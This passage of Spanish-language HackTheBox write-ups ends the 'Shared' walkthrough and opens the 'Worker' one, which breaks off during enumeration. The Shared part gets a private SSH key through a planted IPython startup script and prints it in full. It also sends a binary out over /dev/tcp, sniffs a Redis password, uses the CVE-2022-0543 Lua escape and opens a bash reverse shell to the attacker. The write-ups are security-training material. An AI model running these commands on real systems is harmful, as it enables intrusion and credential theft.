    <p>Vamos a seguir el <code class="language-plaintext highlighter-rouge">Proof of concept</code> primeros vamos a crearnos un directorio después dentro del directorio <code class="language-plaintext highlighter-rouge">profile_default</code> crea otro directorio con el nombre <code class="language-plaintext highlighter-rouge">startup</code> y después crea un <code class="language-plaintext highlighter-rouge">script</code> con nombre <code class="language-plaintext highlighter-rouge">foo.py</code> y le mete contenido y podemos decirle que como el usuario que queremos convertirnos esta corriendo el proceso pues que cuando se inicie se ejecuta el script y nos de clave <code class="language-plaintext highlighter-rouge">id_rsa</code> y no la ponga en una ruta del sistema para poder conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> con ese usuario.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> <span class="nt">-m</span> 777 profile_default/startup <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'import os; os.system("cat ~/.ssh/id_rsa &gt; /dev/shm/key")'</span> <span class="o">&gt;</span> profile_default/startup/foo.py
</code></pre></div></div>

<ul>
  <li>Ahora vamos a esperar que se ejecute la tarea para ver la <code class="language-plaintext highlighter-rouge">id_rsa</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat </span>key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nb">cat</span>: key: No such file or directory
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
james_mason@shared:/opt/scripts_review<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/<span class="p">;</span> <span class="nb">cat</span> /dev/shm/key
total 3036
<span class="nt">-rw-r--r--</span> 1 dan_smith   dan_smith      2602 May 26 16:22 key
<span class="nt">-rwxr-xr-x</span> 1 james_mason james_mason 3104768 May 26 15:54 pspy64
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<h2 id="shell-as-dan_smith">Shell as dan_smith</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nano id_rsa
➜  content <span class="nb">chmod </span>600 id_rsa
➜  content ssh <span class="nt">-i</span> id_rsa dan_smith@10.10.11.172
Linux shared 5.10.0-16-amd64 <span class="c">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 14 14:43:34 2022 from 10.10.14.4
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
24a48911a42a2b121474cc933cdc48db
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>dan_smith<span class="o">)</span>,1001<span class="o">(</span>developer<span class="o">)</span>,1003<span class="o">(</span>sysadmin<span class="o">)</span>
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver archivos donde el grupo sea para <code class="language-plaintext highlighter-rouge">sysadmin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>find / <span class="nt">-group</span> sysadmin 2&gt;/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/redis_connector_dev
<span class="nt">-rwxr-x---</span> 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
dan_smith@shared:~<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Y es un binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>file redis_connector_dev
redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go <span class="nv">BuildID</span><span class="o">=</span>sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
</code></pre></div></div>

<ul>
  <li>Si lo ejecutamos vemos esto <a href="https://aws.amazon.com/es/elasticache/what-is-redis/">https://aws.amazon.com/es/elasticache/what-is-redis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/usr/local/bin<span class="nv">$ </span>./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3239
run_id:4450568378af75bfe290423a2b40a410f84df22d
tcp_port:6379
uptime_in_seconds:3
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479317
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 &lt;nil&gt;
</code></pre></div></div>

<ul>
  <li>Si escribimos <code class="language-plaintext highlighter-rouge">redis</code> y tabulamos vemos varios <code class="language-plaintext highlighter-rouge">redis</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis
redis-benchmark      redis-check-aof      redis-check-rdb      redis-cli            redis_connector_dev  redis-server
dan_smith@shared:~<span class="nv">$ </span>redis
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí nos dicen como podemos enumerar <code class="language-plaintext highlighter-rouge">redis</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a>.</p>
  </li>
  <li>
    <p>Nos conectamos pero no podemos ver información.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; INFO
NOAUTH Authentication required.
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si probamos con las credenciales que tenemos no funcionan.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6379&gt; AUTH james_mason Soleil101
<span class="o">(</span>error<span class="o">)</span> WRONGPASS invalid username-password pair
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Para hacer pruebas desde nuestro entorno de atacante vamos a mandarnos el binario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span><span class="nb">cat</span> &lt; /usr/local/bin/redis_connector_dev <span class="o">&gt;</span> /dev/tcp/10.10.14.55/443
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> redis_connector_dev
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 51872
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">chmod</span> +x redis_connector_dev
➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
 dial tcp <span class="o">[</span>::1]:6379: connect: connection refused
</code></pre></div></div>

<ul>
  <li>El error básicamente es que no hay conexión con el puerto en escucha entonces nos vamos a poner en escucha en ese puerto para ver que nos llega.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./redis_connector_dev
<span class="o">[</span>+] Logging to redis instance using password...

INFO <span class="nb">command </span>result:
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 6379
listening on <span class="o">[</span>any] 6379 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 55836
<span class="k">*</span>2
<span class="nv">$4</span>
auth
<span class="nv">$16</span>
<span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
</code></pre></div></div>

<ul>
  <li>Como tenemos la contraseña ya nos podemos autenticar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; INFO
<span class="c"># Server</span>
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3445
run_id:4d12a99f866d54b324c8dfa89c18f417d25a6fe8
tcp_port:6379
uptime_in_seconds:16
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:5479871
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0

<span class="c"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:8
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

<span class="c"># Memory</span>
used_memory:873328
used_memory_human:852.86K
used_memory_rss:15282176
used_memory_rss_human:14.57M
used_memory_peak:873328
used_memory_peak_human:852.86K
used_memory_peak_perc:100.17%
used_memory_overhead:830336
used_memory_startup:809832
used_memory_dataset:42992
used_memory_dataset_perc:67.71%
allocator_allocated:1287608
allocator_active:1605632
allocator_resident:4182016
total_system_memory:2078982144
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.25
allocator_frag_bytes:318024
allocator_rss_ratio:2.60
allocator_rss_bytes:2576384
rss_overhead_ratio:3.65
rss_overhead_bytes:11100160
mem_fragmentation_ratio:18.39
mem_fragmentation_bytes:14451360
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:20504
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1716755887
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

<span class="c"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:68
total_net_output_bytes:39
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:3
total_writes_processed:2
io_threaded_reads_processed:0
io_threaded_writes_processed:0

<span class="c"># Replication</span>
role:master
connected_slaves:0
master_replid:5785490148c587b8fd50f8a935ace659f1056459
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c"># CPU</span>
used_cpu_sys:0.016155
used_cpu_user:0.047905
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c"># Modules</span>

<span class="c"># Cluster</span>
cluster_enabled:0

<span class="c"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Si buscamos alguna forma de elevar privilegios encontramos lo siguiente <a href="https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis">https://thesecmaster.com/blog/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/shared/18.png" />
</p>

<ul>
  <li>Si hacemos un <code class="language-plaintext highlighter-rouge">whoami</code> vemos que funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:~<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("whoami", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
<span class="s2">"root</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt;
</code></pre></div></div>

<ul>
  <li>Bueno como podemos ejecutar comandos vamos a enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>reverse
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Nos enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dan_smith@shared:/dev/shm<span class="nv">$ </span>redis-cli
127.0.0.1:6379&gt; AUTH <span class="nv">F2WHqJUz2WEz</span><span class="o">=</span>Gqq
OK
127.0.0.1:6379&gt; <span class="nb">eval</span> <span class="s1">'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("bash /dev/shm/reverse", "r"); local res = f:read("*a"); f:close(); return res'</span> 0
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.172] 50994
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>3619<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@shared:/var/lib/redis#
</code></pre></div></div>

<h2 id="roottxt">Root.txt</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@shared:/var/lib/redis# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
a5f9fb3e112adc4dd4e6650e64d240e1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Worker (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html" rel="alternate" type="text/html" title="HackTheBox - Worker (medium)" /><published>2024-05-17T00:00:00-06:00</published><updated>2024-05-17T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/05/17/worker.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png" />
</p>

<ul>
  <li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,3690,5985 10.10.10.203 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-14 18:47 CST
Nmap scan report <span class="k">for </span>10.10.10.203
Host is up <span class="o">(</span>0.087s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Comenzamos enumerando el puerto 80.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.203</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/worker/1.png" />
</p>

<ul>
  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.203 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
<span class="o">===============================================================</span>
Gobuster v3.6
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.203
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 80
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.6
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
</code></pre></div></div>

<ul>
  <li>
